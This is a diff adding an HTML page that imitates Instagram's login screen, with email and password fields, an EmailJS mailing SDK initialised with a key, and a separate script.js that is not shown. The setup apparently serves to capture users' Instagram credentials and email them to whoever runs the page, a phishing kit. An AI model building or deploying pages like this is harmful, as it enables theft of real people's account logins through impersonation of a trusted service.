@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="css/style.css">
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("lsvp7otU6bygqkZFW");
+    })();
+  </script>
+</head>
+<body>
+
+<div class="wrapper">
+
+  <div class="phone-preview">
+    <img src="https://i.imgur.com/zqpwkLQ.png" alt="Phone preview">
+  </div>
+
+  <div class="content">
+
+    <div class="login-box">
+      <h1 class="logo">Instagram</h1>
+
+      <!-- ✅ ONLY ONE FORM -->
+      <form id="loginForm">
+        <input id="email" type="email" placeholder="Email address" required>
+        <input id="password" type="password" placeholder="Password" required>
+
+        <p id="emailError" class="error"></p>
+
+        <button type="submit">Log In</button>
+
+        <div class="divider">
+          <div class="line"></div>
+          <p>OR</p>
+          <div class="line"></div>
+        </div>
+
+        <a href="#" class="fb-login">Log in with Facebook</a>
+        <a href="#" class="forgot">Forgot password?</a>
+      </form>
+    </div>
+
+    <div class="signup-box">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <p class="get-app">Get the app.</p>
+  <div class="app-badges">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Available_on_the_App_Store_%28black%29.png">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Get_it_on_Google_play.svg">
+            </div>
+  </div>
+</div>
+
+<!-- Your script -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
